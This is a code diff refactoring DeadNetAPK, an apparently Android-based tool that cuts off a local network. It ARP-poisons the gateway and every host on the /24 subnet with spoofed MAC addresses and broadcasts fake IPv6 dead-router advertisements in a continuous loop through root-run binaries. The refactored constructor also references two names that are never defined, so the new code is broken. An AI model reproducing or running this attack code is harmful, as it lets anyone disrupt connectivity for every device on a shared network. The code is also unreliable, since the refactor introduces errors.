@@ -38,77 +38,75 @@ class DeadNetAPK:
         "i386": "i386",
     }
 
-    def __init__(self, iface, gateway_ipv4, gateway_ipv6, gateway_mac=None, print_mtd=None):
+    def __init__(self, iface: str, gateway_ipv4: str, gateway_ipv6: str, gateway_mac: str, print_mtd: str):
         self._spoof_ipv6ra_interval = 5
         self._executor_sleep_interval = 0.1
         self._max_workers = 3
 
-        self.network_interface = iface
-        conf.iface = self.network_interface
+        self._network_interface = iface
+        conf.iface = self._network_interface
 
         self.print_mtd = print_mtd
-        self.my_mac = get_device_mac_address_su(self.network_interface)
-        if self.my_mac == NET_UNDEFINED:
+        self._my_mac = get_device_mac_address_su(self._network_interface)
+        if self._my_mac == NET_UNDEFINED:
             raise Exception("Failed to get device MAC address")
-        Logger.info(f"DeadNet: Set up user mac as {self.my_mac}")
-        self.loop_count = 0
+        Logger.info(f"DeadNet: Set up user mac as {self._my_mac}")
+        self._loop_count = 0
 
-        self.abort = str()
-        self.user_abort_reason = f"status - {RED}stopped{COLOR_RESET}"
+        self._abort = str()
+        self._user_abort_reason = f"status - {RED}stopped{COLOR_RESET}"
 
-        self.arch_type = self._BINARY_MAP.get(pt.machine())
-        if not self.arch_type:
+        arch_type = self._BINARY_MAP.get(pt.machine())
+        if not arch_type:
             Logger.info(f"DeadNet: Unsupported device machine architecture {pt.machine()}")
             raise Exception(f"Unsupported device machine architecture -> {pt.machine()}")
 
-        if not self._prepare_binaries():
+        if not self._prepare_binaries(arch_type):
             raise Exception("Failed to prepare binaries")
 
-        self.gateway_ipv6 = gateway_ipv6
-        self.ipv6_prefix, self.ipv6_preflen = get_ipv6_prefdata(self.network_interface) if self.gateway_ipv6 != NET_UNDEFINED else (None, None)
+        self._gateway_ipv6 = gateway_ipv6
+        self._ipv6_prefix, self._ipv6_preflen = get_ipv6_prefdata(self._network_interface) if self._gateway_ipv6 != NET_UNDEFINED else (None, None)
 
-        self.spoof_ipv6ra = self.ipv6_prefix and self.ipv6_preflen
-        Logger.info(f"DeadNet: spoof_ipv6ra set to {self.spoof_ipv6ra}")
+        self._spoof_ipv6ra = self._ipv6_prefix and self._ipv6_preflen
+        Logger.info(f"DeadNet: spoof_ipv6ra set to {self._spoof_ipv6ra}")
 
-        self.user_ipv4 = get_if_addr(self.network_interface)
-        Logger.info(f"DeadNet: user_ipv4 set to {self.user_ipv4}")
-
-        self.subnet_ipv4 = self.user_ipv4.split(".")[:3]
-        self.subnet_ipv4_sr = f"{'.'.join(self.subnet_ipv4)}.0/24"  # assuming CIDR length is 24
-        Logger.info(f"DeadNet: subnet_ipv4_sr set to {self.subnet_ipv4_sr}")
-
-        self.gateway_ipv4 = gateway_ipv4
-        self.gateway_mac = gateway_mac
-        self.gateway_mac_fake = generate_random_mac()
-        Logger.info(f"Deadnet: Generated spoofed gateway mac {self.gateway_mac_fake}")
-        if not self.gateway_mac:
+        self._gateway_ipv4 = gateway_ipv4
+        self._gateway_mac = gateway_mac
+        self._gateway_mac_fake = generate_random_mac()
+        Logger.info(f"Deadnet: Generated spoofed gateway mac {self._gateway_mac_fake}")
+        if not self._gateway_mac:
             raise Exception(f"Unable to get gateway MAC address")
 
-        self.host_ipv4s = [str(host_ip) for host_ip in ipaddress.IPv4Network(self.subnet_ipv4_sr) if
-                           str(host_ip) != self.user_ipv4 and str(host_ip) != self.gateway_ipv4]
+        user_ipv4 = get_if_addr(self._network_interface)
+        Logger.info(f"DeadNet: user_ipv4 set to {self._user_ipv4}")
+        subnet_ipv4 = user_ipv4.split(".")[:3]
+        subnet_ipv4_sr = f"{'.'.join(subnet_ipv4)}.0/24"  # assuming CIDR length is 24
+        Logger.info(f"DeadNet: subnet_ipv4_sr set to {subnet_ipv4_sr}")
+        self._host_ipv4s = [str(host_ip) for host_ip in ipaddress.IPv4Network(subnet_ipv4_sr) if
+                            str(host_ip) != _user_ipv4 and str(host_ip) != self._gateway_ipv4]
 
-        self.intro = str()
-        if self.spoof_ipv6ra:
-            self.intro += f"Dead router attack (IPv6) - {GREEN}enabled{COLOR_RESET}\n" \
-                          f"IPv6 prefix - {self.ipv6_prefix}/{self.ipv6_preflen}\n" \
-                          f"IPv6 gateway - {self.gateway_ipv6}\n\n"
+        self._intro = str()
+        if self._spoof_ipv6ra:
+            self._intro += f"Dead router attack (IPv6) - {GREEN}enabled{COLOR_RESET}\n" \
+                          f"IPv6 prefix - {self._ipv6_prefix}/{self._ipv6_preflen}\n" \
+                          f"IPv6 gateway - {self._gateway_ipv6}\n\n"
         else:
-            self.intro += f"Dead router attack (IPv6) - {RED}disabled{COLOR_RESET}\n\n"
+            self._intro += f"Dead router attack (IPv6) - {RED}disabled{COLOR_RESET}\n\n"
 
-        self.intro += f"ARP poisoning (IPv4) - {GREEN}enabled{COLOR_RESET}\n" \
-                      f"IPv4 subnet range - {self.subnet_ipv4_sr}\n" \
-                      f"IPv4 gateway - {self.gateway_ipv4}\n\n"
+        self._intro += f"ARP poisoning (IPv4) - {GREEN}enabled{COLOR_RESET}\n" \
+                      f"IPv4 subnet range - {subnet_ipv4_sr}\n" \
+                      f"IPv4 gateway - {self._gateway_ipv4}\n\n"
 
-    def _prepare_binaries(self):
+    def _prepare_binaries(self, arch_type: str) -> bool:
         try:
             # dynamic internal path
             internal_dir = get_app_data_dir()
 
             # construct source and destination paths
-            arp_orig_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'assets', f'arp.{self.arch_type}')
-            self.arp_path = os.path.join(internal_dir, f'arp.{self.arch_type}')
-            nra_orig_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'assets', f'nra.{self.arch_type}')
-            self.nra_path = os.path.join(internal_dir, f'nra.{self.arch_type}')
+            arp_orig_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'assets', f'arp.{arch_type}')
+            self.arp_path = os.path.join(internal_dir, f'arp.{arch_type}')
+            nra_orig_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'assets', f'nra.{arch_type}')
+            self.nra_path = os.path.join(internal_dir, f'nra.{arch_type}')
 
             for src_path, dest_path in [[arp_orig_path, self.arp_path],
                                         [nra_orig_path, self.nra_path]]:
@@ -122,59 +120,59 @@ class DeadNetAPK:
             Logger.error(f"DeadNet: Unexpected error - {e}, traceback: {traceback.format_exc()}")
         return False
 
-    def user_abort(self):
-        self.abort = self.user_abort_reason
+    def user_abort(self) -> None:
+        self._abort = self._user_abort_reason
 
-    def worker_attack_task(self, idx, host_ip):
-        if self.spoof_ipv6ra and idx % self._spoof_ipv6ra_interval == 0:
-            self.do_ipv6_attack()
-        self.do_ipv4_attack(host_ip)
+    def _worker_attack_task(self, idx: int, host_ip: str) -> None:
+        if self._spoof_ipv6ra and idx % self._spoof_ipv6ra_interval == 0:
+            self._do_ipv6_attack()
+        self._do_ipv4_attack(host_ip)
 
-    def do_ipv4_attack(self, host_ip):
+    def _do_ipv4_attack(self, host_ip: str) -> None:
         """
         * poison the gateway arp cache with a spoofed mac address for every possible host
         * poison every possible host with a spoofed mac address for the gateway
         """
         subprocess.Popen(
-            f"su -c {self.arp_path} {host_ip} {generate_random_mac()} {self.gateway_ipv4} {self.gateway_mac} {self.my_mac}",
+            f"su -c {self.arp_path} {host_ip} {generate_random_mac()} {self._gateway_ipv4} {self._gateway_mac} {self._my_mac}",
             shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         subprocess.Popen(
-            f"su -c {self.arp_path} {self.gateway_ipv4} {self.gateway_mac_fake} {host_ip} ff:ff:ff:ff:ff:ff {self.my_mac}",
+            f"su -c {self.arp_path} {self._gateway_ipv4} {self._gateway_mac_fake} {host_ip} ff:ff:ff:ff:ff:ff {self._my_mac}",
             shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-    def do_ipv6_attack(self):
+    def _do_ipv6_attack(self) -> None:
         """
         * broadcast a fake dead default router message
         """
-        subprocess.Popen(f"su -c {self.nra_path} {self.gateway_mac} {self.gateway_ipv6} "
-                         f"{self.ipv6_prefix} {self.ipv6_preflen} {self.network_interface}",
+        subprocess.Popen(f"su -c {self.nra_path} {self._gateway_mac} {self._gateway_ipv6} "
+                         f"{self._ipv6_prefix} {self._ipv6_preflen} {self._network_interface}",
                          shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-    def start_workers_attack_loop(self):
+    def _start_workers_attack_loop(self) -> None:
         with ThreadPoolExecutor(max_workers=self._max_workers) as executor:
-            for idx, ip in enumerate(self.host_ipv4s):
-                if self.abort:
+            for idx, ip in enumerate(self._host_ipv4s):
+                if self._abort:
                     return
-                executor.submit(self.worker_attack_task, idx, ip)
-                Clock.schedule_once(lambda dt: self.print_mtd(f"{self.intro}status - {GREEN}running...{COLOR_RESET} cycle #{self.loop_count} "
-                                                              f"{GRAY}[{idx + 1} / {len(self.host_ipv4s)}]{COLOR_RESET}"))
+                executor.submit(self._worker_attack_task, idx, ip)
+                Clock.schedule_once(lambda dt: self.print_mtd(f"{self._intro}status - {GREEN}running...{COLOR_RESET} cycle #{self._loop_count} "
+                                                              f"{GRAY}[{idx + 1} / {len(self._host_ipv4s)}]{COLOR_RESET}"))
 
                 time.sleep(self._executor_sleep_interval)
 
-    def start_attack(self):
-        while not self.abort:
+    def start_attack(self) -> None:
+        while not self._abort:
             try:
-                self.loop_count += 1
-                self.start_workers_attack_loop()
+                self._loop_count += 1
+                self._start_workers_attack_loop()
 
             except Exception as e:
-                self.abort = "Error in attack loop (check debug logs)"
+                self._abort = "Error in attack loop (check debug logs)"
                 Logger.error(f"DeadNet: start_attack exception - {e}, traceback: {traceback.format_exc()}")
             except KeyboardInterrupt:
                 Logger.info("DeadNet: start_attack user_interrupt")
                 self.user_abort()
 
-        if self.abort != self.user_abort_reason:
-            Clock.schedule_once(lambda dt: self.print_mtd(f"{self.abort}", True))
+        if self._abort != self._user_abort_reason:
+            Clock.schedule_once(lambda dt: self.print_mtd(f"{self._abort}", True))
         else:
-            Clock.schedule_once(lambda dt: self.print_mtd(f"{self.intro}{self.abort}"))
+            Clock.schedule_once(lambda dt: self.print_mtd(f"{self._intro}{self._abort}"))
